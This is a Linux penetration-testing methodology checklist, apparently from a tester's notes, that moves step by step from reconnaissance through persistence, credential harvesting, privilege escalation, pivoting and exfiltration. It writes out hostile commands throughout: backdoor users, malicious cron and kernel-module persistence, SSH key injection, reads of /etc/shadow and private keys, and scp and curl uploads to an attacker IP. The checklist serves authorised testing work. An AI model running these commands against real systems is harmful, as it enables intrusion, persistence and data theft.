# Index
- [[Methodology]]
	- [[Physical Access Methodology]]
	- [[Linux Methodology]]
	- [[Windows Methodology]]
	- [[Web Application Methodology]]
	- [[Cloud Methodology]]

# External Reconnaissance
- [ ] **OSINT:** Gather emails, domains, IP addresses, and open ports related to the target.
- [ ] **Nmap:** Conduct a comprehensive scan to identify open ports and services.
    - `nmap -n -Pn -A <target_ip> -p- -o <assessment_number>_<system_name>_<date>`
- [ ] **Nessus:** Identify vulnerabilities, misconfigurations, and outdated patches using Nessus.
- [ ] **Shodan/Censys:** Search for exposed services and vulnerabilities related to the web application.
    - `shodan search <target_ip>`

# Initial Access
- [ ] **Insecure Ports:** Analyze open ports and manually enumerate services (e.g., `netcat`, `telnet`, `curl`).
- [ ] **Exploit Public-Facing Services:** Use exploitation tools (e.g., `Metasploit`, `searchsploit`, CVE exploits) against services like SSH, Apache, etc.
- [ ] **Default Credentials/Null Logon:** Exploit default credentials or null logons on public services.
- [ ] **Password Spraying/Brute Force:** Use tools such as `Hydra` or `CrackMapExec` for brute-forcing services like SSH, FTP, or web applications.
- [ ] **Social Engineering/Phishing:** Launch spear-phishing attacks delivering payloads (e.g., ELF binaries or embedded Office document payloads).

# Internal Reconnaissance

## Host Based
- [ ] **System Information:** Gather basic system details like kernel version, OS, architecture, etc.
	- `uname -a`
	- `cat /etc/os-release`
- [ ] **User Information and Permissions:** List users, their permissions, and any elevated access.
	- `cat /etc/passwd`
	- `id <username>`
- [ ] **Group Information and Permissions:** Enumerate groups and their associated users.
- [ ] **Process and Service Enumeration:** Identify running processes and services for exploitation.
	- `ps aux`
	- `systemctl list-units --type=service`
- [ ] **File System Enumeration:** Search for sensitive files and directories.
	- `find / -type f \( -name '*.conf' -o -name '*.log' \)`
- [ ] **Installed Software and Package Management:** Check for software and package vulnerabilities.
	- `dpkg -l` (Debian-based)
	- `rpm -qa` (Red Hat-based)
- [ ] **Check Logs:** Inspect log files for valuable information such as login details, errors, or debug logs.
	- `cat /var/log/auth.log`
	- `cat /var/log/syslog`

## Network Based
- [ ] **Network Interfaces and Configuration:** Review network interface configurations.
	- `ifconfig` or `ip addr`
- [ ] **Routing Tables and Gateway Information:** Identify routing details and gateways.
	- `route -n`
	- `ip route`
- [ ] **DNS Enumeration:** Investigate DNS records or configurations for internal use.
	- `cat /etc/resolv.conf`
	- `dig <domain>`
- [ ] **Active Network Connections:** Analyze current network connections to find internal services.
	- `netstat -tulnp`
	- `ss -tulnp`
- [ ] **Firewall and Security Settings:** Identify misconfigurations or weak firewall rules.
	- `iptables -L`
	- `ufw status`
- [ ] **Neighboring Hosts and Network Discovery:** Map out the internal network and neighboring hosts.
	- `arp -a`
	- `nmap -sP <network_range>`
- [ ] **Network Shares:** Enumerate available network shares.
	- `showmount -e <server_ip>` (NFS shares)
- [ ] **Network Services:** List running network services for potential lateral movement.
- [ ] **Packet Sniffing:** Capture network traffic to analyze sensitive data (e.g., `tcpdump`, `Wireshark`).
	 - `tcpdump -i <interface> -w capture.pcap`

# Persistence
- [ ] **Create New User:** Add a backdoor user for persistent access.
	- `useradd <username> -m -s /bin/bash`
	- `passwd <username>`
- [ ] **Add User to Privileged Group:** Add the user to privileged groups such as `sudo` or `wheel`.
	- `usermod -aG sudo <username>`
- [ ] **Modify Existing User:** Alter existing accounts for persistence.
- [ ] **Cron Jobs:** Add or modify cron jobs to ensure persistent access.
	- `crontab -e`
	- `echo "@reboot /path/to/malicious_script" >> /etc/crontab`
- [ ] **Bash Profile:** Modify the `.bashrc` or `.bash_profile` to run commands at login.
- [ ] **rc.local:** Modify `/etc/rc.local` to execute persistent scripts at boot.
	- `echo "<command>" >> ~/.bashrc`
	- `echo "<command>" >> /etc/rc.local`
- [ ] **Environmental Variables:** Alter environment variables for backdoors or persistence.
- [ ] **Library Injection:** Inject malicious code into shared libraries to persist within applications.
- [ ] **System Binary Modification:** Replace critical system binaries with trojaned versions.
- [ ] **Systemd Services:** Add or alter `systemd` services to ensure persistence.
	 - `systemctl enable <service_name>`
- [ ] **System Boot Scripts:** Modify system boot scripts for persistent execution.
- [ ] **Kernel Module:** Insert malicious kernel modules to maintain root-level access.
	- `insmod <malicious_module.ko>`
- [ ] **Bootloader (Grub):** Modify Grub configurations to allow recovery or re-entry to the system.
- [ ] **SSH Key Injection:** Place your SSH public key into `~/.ssh/authorized_keys`.
	 - `echo "<public_key>" >> ~/.ssh/authorized_keys`

# Credential Harvesting
- [ ]  **Local Account Passwords:** Extract and crack password hashes from `/etc/shadow`.
    - `cat /etc/shadow`
    - Crack with `John the Ripper` or `Hashcat`.
- [ ]  **SSH Keys:** Locate private SSH keys on the system.
    - `find / -name id_rsa 2>/dev/null`
- [ ]  **Credential Files and Cleartext Passwords:** Search for cleartext passwords in config files or logs.
    - `grep -r "password" /etc/`
- [ ]  **GPG/PGP Keys:** Search for encrypted GPG or PGP keyrings in user directories.
    - `find / -name *.gpg`
- [ ]  **Memory Dumping:** Dump process memory to extract credentials or sensitive data.
    - `gcore <pid>`
    - `strings core.<pid>`
- [ ]  **Mounting Disk Partitions:** Mount a disk or backup image to recover files, credentials, or configuration settings.
    - `mount /dev/sdb1 /mnt`
- [ ]  **Network Traffic Analysis:** Use packet capture tools like `tcpdump` or `Wireshark` to intercept credentials in transit.
    - `tcpdump -i <interface> -w capture.pcap`

# Privilege Escalation
- [ ]  **Sudo Permissions:** Check for misconfigured `sudo` permissions that allow privilege escalation.
    - `sudo -l`
- [ ]  **SUID/SGID Binaries:** Search for files with the SUID or SGID bit set that can be exploited.
    - `find / -perm -4000 -type f 2>/dev/null`
- [ ]  **Exploiting Misconfigured Cron Jobs:** Identify and exploit weak cron job configurations.
    - `cat /etc/crontab`
- [ ] **System Capabilities:** Check system capabilities and escalate by manipulating them.
    - `getcap -r / 2>/dev/null`
- [ ]  **Exploiting Environmental Variables:** Exploit misconfigured environmental variables for privilege escalation.
    - `echo $PATH`
- [ ]  **PATH Hijacking:** Identify writable directories in the system's `PATH` and hijack commands.
    - `echo $PATH`
- [ ]  **Weak File Permissions:** Search for writable files owned by privileged users.
    - `find / -perm /o+w 2>/dev/null`
- [ ]  **Kernel Exploits:** Use known kernel vulnerabilities for privilege escalation (e.g., `dirtycow`).
    - `searchsploit linux kernel`

# Lateral Movement/Pivoting/Tunneling
- [ ]  **SSH:** Use SSH for lateral movement or pivoting through compromised systems.
    - `ssh <user>@<target_ip>`
- [ ]  **ProxyChains:** Use `ProxyChains` to tunnel traffic through compromised hosts.
    - `proxychains nmap -sT <target_ip>`
- [ ]  **SSH Local Port Forwarding:** Set up SSH port forwarding to pivot through a host.
    - `ssh -L <local_port>:<target_ip>:<remote_port> <user>@<pivot_ip>`
- [ ]  **SSH Dynamic Port Forwarding:** Set up dynamic SOCKS proxy for traffic redirection.
    - `ssh -D <local_port> <user>@<pivot_ip>`
- [ ]  **Netcat/SoCat:** Use `netcat` or `socat` for tunneling or pivoting.
    - `nc -lvp <port>`
    - `socat TCP-LISTEN:<port>,fork TCP:<target_ip>:<port>`
- [ ]  **NFS/SMB Mounting:** Access remote NFS or SMB shares for lateral movement.
    - `mount -t nfs <server_ip>:/<path> /mnt`
- [ ]  **Service Exploitation:** Exploit vulnerable services to pivot between machines (e.g., SSH, NFS).

# Data Exfiltration
- [ ]  **Data Compression and Encryption:** Compress and encrypt files to evade detection.
    - `tar -czvf data.tar.gz /path/to/data`
    - `openssl enc -aes-256-cbc -salt -in data.tar.gz -out data.enc`
- [ ]  **Standard Protocols:** Use standard protocols like FTP, HTTP, or SCP to exfiltrate data.
    - `scp <file> <user>@<attack_ip>:/path/to/save`
    - `curl -T <file> http://<attack_ip>`
- [ ]  **Email:** Send exfiltrated data via email.
    - `mail -s "Data" <recipient_email> < data.tar.gz`
- [ ]  **Cloud Services:** Use cloud services (e.g., Google Drive, AWS S3) to exfiltrate data.
    - `rclone copy <file> remote:bucket`
- [ ]  **Steganography:** Hide sensitive data inside images or other file formats.
    - `steghide embed -cf <image.jpg> -ef <file.txt>`
- [ ]  **Physical Media:** Copy sensitive data to physical media (e.g., USB drives) for exfiltration.
- [ ]  **Wireless Networks:** Use a wireless network for data exfiltration if network segmentation allows.